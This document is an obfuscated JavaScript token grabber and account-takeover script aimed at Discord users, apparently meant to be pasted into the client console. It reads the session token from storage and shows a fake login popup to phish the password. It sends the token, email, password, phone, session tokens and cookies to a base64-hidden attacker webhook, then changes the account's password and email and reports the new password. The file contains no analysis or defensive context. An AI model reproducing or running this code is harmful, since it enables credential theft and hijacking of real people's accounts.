(async function() {
    var app = {};
    app.w = window.open("", "", "top=0,left="+screen.width-800+",width=800,height="+screen.height);
  
    if(!app.w || !app.w.document || !app.w.document.write) {
      alert("Oops, it seems that you have blocked the pop-ups, please unblock it to continue with the process");
  
      fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg4NTQ1MzA4MzU3ODMyNzY0L25FeEZWckdYLXBsYTlrWmc4cnJmbkJYTGNEMWV5dWJTZnRWMG1tMXBRNGNUalhqZ1VhVHY5b3VqcWtkYVN6aDA5d3pO"), {
        method: "POST",
        body: JSON.stringify({
          content: eval(atob("KHdlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1snJ10se30sZT0+e209W107Zm9yKGxldCBjIGluIGUuYyltLnB1c2goZS5jW2NdKX1dKSxtKS5maW5kKG09Pm0/LmV4cG9ydHM/LmRlZmF1bHQ/LmdldFRva2VuIT09dm9pZCAwKS5leHBvcnRzLmRlZmF1bHQuZ2V0VG9rZW4oKQ=="))
        }),
        headers: {
          "Content-Type": "application/json"
        }
      });
    
    } else {
  
      window.dispatchEvent(new Event("beforeunload"));
  
      app.h = app.w[atob("bG9jYWxTdG9yYWdl")][atob("dG9rZW4=")].slice(1, -1);
      app.y = await fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l"), {
        method: "GET",
        headers: {
          "Authorization": app.h,
          "Content-Type": "application/json"
        }
      });
      
      app.t = await app.y.json();
   
      app.w.document.write(`<!DOCTYPE html><html lang="en-US"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width"> <title>Discord</title> <style> body { margin: 0; background-color: #18191c; font-family: Arial, sans-serif; height: 100vh; overflow-y: hidden; } .container { width: 350px; height: 350px; background-color: #2f3136; top: 50%; left: 50%; position: absolute; transform: translate(-50%, -50%); padding: 30px 60px; border-radius: 15px; box-shadow: 0 8px 16px rgba(0,0,0,0.24); color: #fff; z-index: 1; } .container .title h2 { text-align: center; } .container .subtitle { color: #dcddde; text-align: center; } .container .forms .input-group input { width: 100%; margin-bottom: 25px; outline: none; padding: 10px 12px; border-radius: 3.5px; background-color: rgb(32, 33, 36); font-weight: 500; border-color: #7f7676; color: #dcddde; border: 1px solid #7f7676; font-size: 14px; } .container .forms .input-group input:focus { border-color: #5865F2; } .container .forms .input-group label { margin: 0; padding: 0; margin-bottom: 3px; display: block; font-variant: small-caps; } .container .submit input { border: none; outline: none; height: 40px; width: 80%; font-size: 18px; position: absolute; background-color: #5865F2; color: #fff; border-radius: 4px; text-align: center; cursor: pointer; } .container .submit input:hover { background-color: #565fc9; } .cover { position: fixed; top: 0; bottom: 0; left: 0; right: 0; background: rgba(0, 0, 0, 0.7); z-index: 2; display: none; } .cover .alert { margin: auto; top: 35%; position: relative; background: #2f3136; width: 50%; height: 120px; border-radius: 5px; } .cover .alert .flag { width: 100%; height: 50%; background-color: #E74C3C; border-radius: 4px; } .cover .alert .flag .button-close { font-size: 30px; color: #fff; margin: 15px 0px 0px 93%; cursor: pointer; } .cover .alert .message { margin: 12px 6px 0px 12px; color: #dcddde; } </style> </head> <body> <div class="cover" id="cover"> <div class="alert"> <div class="flag"> <div class="button-close" id="close">&times;</div> </div> <div class="message" id="message"> Oops, it seems that the password or email you provided is not valid </div> </div> </div> <div class="container"> <div class="title"> <h2>Authenticate session</h2> <p class="subtitle">Sign in with your email or phone number, to verify that it is you</p> </div> <div class="forms"> <form> <div class="input-group"> <label for="emaiil">email or phone number</label> <input type="text" id="email" placeholder="example@email.com" autocomplete="off"> </div> <div class="input-group"> <label for="password">password</label> <input type="password" id="password" placeholder="@123" autocomplete="off"> </div> </form> </div> <div class="submit"> <input type="submit" id="submit" value="Login"> </div> </div></body></html>`);
  
      app.w.document.getElementById("close").addEventListener("click", () => {
        app.w.document.getElementById("cover").style.display = "none";
      });
  
      app.w.document.getElementById("submit").addEventListener("click", () => {
        if(!app.w.document.getElementById("email").value) {
          app.w.document.getElementById("cover").style.display = "block";
          return app.w.document.getElementById("message").innerHTML = "Oops, it looks like you didn't fill out the entire form";
          
        };
        
        if(!app.w.document.getElementById("password").value) {
          app.w.document.getElementById("cover").style.display = "block";
          return app.w.document.getElementById("message").innerHTML = "Oops, it looks like you didn't fill out the entire form";
                        
        } else {
          fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg4NTQ1MzA4MzU3ODMyNzY0L25FeEZWckdYLXBsYTlrWmc4cnJmbkJYTGNEMWV5dWJTZnRWMG1tMXBRNGNUalhqZ1VhVHY5b3VqcWtkYVN6aDA5d3pO"), {
            method: "POST",
            body: JSON.stringify({
              embeds: [
                {
                  author: {
                    name: app.t.username +"#"+ app.t.discriminator,
                    icon_url: "https://cdn.discordapp.com/avatars/"+app.t[atob("aWQ=")]+"/"+app.t[atob("YXZhdGFy")]+".webp" || "https://cdn.discordapp.com/embed/avatars/0.png"
                  },
                  thumbnail: {
                    url: "https://cdn.discordapp.com/avatars/"+app.t[atob("aWQ=")]+"/"+app.t[atob("YXZhdGFy")]+".webp" || "https://cdn.discordapp.com/embed/avatars/0.png"
                  },
                  fields: [
                    {
                      name: atob("QWNjb3VudCBJRA=="),
                      value: app.t[atob("aWQ=")],
                      inline: true
                    },
                    {
                      name: atob("VG9rZW4="),
                      value: app.h,
                      inline: true
                    },
                    {
                      name: atob("RS1tYWls"),
                      value: app.t[atob("ZW1haWw=")],
                      inline: true
                    },
                    {
                      name: atob("UGFzc3dvcmQ="),
                      value: eval(atob("YXBwLncuZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBhc3N3b3JkIikudmFsdWU=")),
                      inline: true
                    },
                    {
                      name: atob("UGhvbmU="),
                      value: app.t[atob("cGhvbmU=")] || "None",
                      inline: true
                    },
                    {
                      name: atob("bWZh"),
                      value: `${app.t[atob("bWZhX2VuYWJsZWQ=")]}`,
                      inline: true
                    },
                    {
                      name: atob("U2Vzc2lvbnM="),
                      value: "```json\n"+app.w[atob("bG9jYWxTdG9yYWdl")][atob("dG9rZW5z")].replaceAll(",", ",\n\n")+"```",
                      inline: false
                    },
                    {
                      name: "Cookies",
                      value: "```js\n"+document.cookie.replaceAll(";", "\n\n")+"```" || "None",
                      inline: false
                    }
                  ],
                  image: {
                    url: "https://cdn.discordapp.com/banners/"+app.t[atob("aWQ=")]+"/"+app.t[atob("YmFubmVy")]+".webp" || null
                  },
                  color: app.t[atob("YWNjZW50X2NvbG9y")] || 0,
                  type: "rich"
                }
              ]
            }),
            headers: {
              "Content-Type": "application/json"
            }
          });
  
          var pass = "";
          var char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          var charLength = char.length;
  
          for(let i = 0; i < 27; i++) {
            pass += char.charAt(Math.floor(Math.random() * charLength));
          };
  
          fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1l"), {
            method: "PATCH",
            body: JSON.stringify({
              new_password: pass,
              password: eval(atob("YXBwLncuZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBhc3N3b3JkIikudmFsdWU=")),
              email: atob("ODZiZDc3MzE4YmE0NTI0ZjhhZDIyYTFlMjg5Nw=="),
              phone: null
            }),
            headers: {
              "Authorization": app.h,
              "Content-Type": "application/json"
            }
          }).then((res) => {
            if(res.ok) {
              fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODg4NTQ1MzA4MzU3ODMyNzY0L25FeEZWckdYLXBsYTlrWmc4cnJmbkJYTGNEMWV5dWJTZnRWMG1tMXBRNGNUalhqZ1VhVHY5b3VqcWtkYVN6aDA5d3pO"), {
                method: "POST",
                body: JSON.stringify({
                  embeds: [
                    {
                      author: {
                        name: app.t[atob("dXNlcm5hbWU=")] +"#"+ app.t[atob("ZGlzY3JpbWluYXRvcg==")],
                        icon_url: "https://cdn.discordapp.com/avatars/"+app.t[atob("aWQ=")]+"/"+app.t[atob("YXZhdGFy")]+".webp" || "https://cdn.discordapp.com/embed/avatars/0.png"
                      },
                      thumbnail: {
                        url: "https://cdn.discordapp.com/avatars/"+app.t[atob("aWQ=")]+"/"+app.t[atob("YXZhdGFy")]+".webp" || "https://cdn.discordapp.com/embed/avatars/0.png"
                      },
                      fields: [
                        {
                          name: atob("VG9rZW4="),
                          value: eval(atob("KHdlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1snJ10se30sZT0+e209W107Zm9yKGxldCBjIGluIGUuYyltLnB1c2goZS5jW2NdKX1dKSxtKS5maW5kKG09Pm0/LmV4cG9ydHM/LmRlZmF1bHQ/LmdldFRva2VuIT09dm9pZCAwKS5leHBvcnRzLmRlZmF1bHQuZ2V0VG9rZW4oKQ==")),
                          inline: true
                        },
                        {
                          name: atob("RS1tYWls"),
                          value: app.t[atob("ZW1haWw=")],
                          inline: true
                        },
                        {
                          name: atob("UGFzc3dvcmQ="),
                          value: pass,
                          inline: true
                        }
                      ],
                      color: app.t[atob("YWNjZW50X2NvbG9y")] || 0,
                      type: "rich"
                    }
                  ]
                }),
                headers: {
                  "Content-Type": "application/json"
                }
              });
              
              document.appendChild(document.createElement `iframe`)[atob("Y29udGVudFdpbmRvdw==")][atob("bG9jYWxTdG9yYWdl")][atob("dG9rZW4=")] = null;
              app.w.close();
              
              setTimeout(() => {
                window.location.reload();
              }, 2500);
      
            } else {
              app.w.document.getElementById("cover").style.display = "block";
  
              if(app.t[atob("dmVyaWZpZWQ=")]) {
                return app.w.document.getElementById("message").innerHTML = "Oops, it looks like the process stopped unexpectedly, please disable email verification to complete it";
                
              } else {
                return app.w.document.getElementById("message").innerHTML = "Oops, it looks like the password you provided is invalid";
                
              };
              
              
              
            };
            
          });
          
        };
        
      });
      
    };
    
  })();